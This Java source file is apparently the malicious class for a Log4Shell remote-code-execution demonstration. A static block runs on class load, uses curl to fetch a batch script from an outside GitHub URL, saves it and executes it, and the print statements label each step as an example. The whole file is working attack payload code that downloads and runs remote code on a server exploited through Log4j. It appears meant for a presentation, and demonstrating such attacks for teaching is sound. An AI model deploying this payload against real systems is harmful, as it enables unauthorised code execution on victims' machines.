import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;

public class Log4jRCE {

    static {
        System.out.println("Executing remote code using static block.");
        try {
            System.out.println("Example 1 : Call remote server & download malicious script to the server.");
            String[] cmd = { "curl", "https://raw.githubusercontent.com/mrafsyam/log4shell-presentation/main/remote-script.bat" };
            Process pro = java.lang.Runtime.getRuntime().exec(cmd);
            BufferedReader r = new BufferedReader(new InputStreamReader(pro.getInputStream()));
            String line = null;
            PrintWriter writer = new PrintWriter("remote-script.bat", "UTF-8");
            while ((line = r.readLine()) != null) {
                writer.println(line);
            }
            writer.close();

            System.out.println("Example 2 : Executing a downloaded script or App.");
            String[] cmd2 = { "remote-script.bat"};
            Process pro2 = java.lang.Runtime.getRuntime().exec(cmd2);

            BufferedReader r2 = new BufferedReader(new InputStreamReader(pro2.getInputStream()));
            String line2 = null;
            while ((line2 = r2.readLine()) != null) {
                System.out.println(line2);
            }
            System.out.println("Done executing remote codes.");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public Log4jRCE(){}
}
